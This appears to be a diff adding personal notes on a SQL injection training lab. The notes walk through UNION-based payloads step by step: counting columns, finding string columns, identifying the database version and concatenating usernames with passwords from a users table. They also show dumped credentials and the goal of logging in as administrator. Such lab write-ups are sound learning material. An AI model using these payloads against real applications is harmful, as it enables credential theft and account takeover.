@@ -1,0 +1,38 @@
+SQL Injection = Product category:
+
+End goal: retrieve all usernams and password from users table and login as administrator
+
+Analysis:
+---------
+
+1. Find no of columns:
+	' ORDER BY 1--
+	' ORDER BY 2--
+	' ORDER BY 3--    --------> error
+
+	no of col = 3-1 = 2
+
+2. Find the colu, with string data type:
+	' union select 'a', NULL--
+	' union select null, 'a'--    -----> prints a so this has string
+
+3. Output froim other table:
+	' union select NULL, username from users--
+	' union select NULL, password from users--
+
+	see the version of database to use concatination
+		' union select NULL, @@version-- (microsoft and mysql)
+		' union select NUll, version frim v$instance-- (oracle)
+
+		' union select NULL, version()--     (postgreSQL) ----> gives result
+		PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+	concatinating passwords and username:
+	' union select null, username || '**' || password from users--
+
+	result:
+		administrator**vxxla7dyjuwxnpfqq9wl
+		wiener**26z4nd18wfhhxsukwbio
+		carlos**tcv3omsh6osyhb6mr4uh
+
+4. Login as administrator.
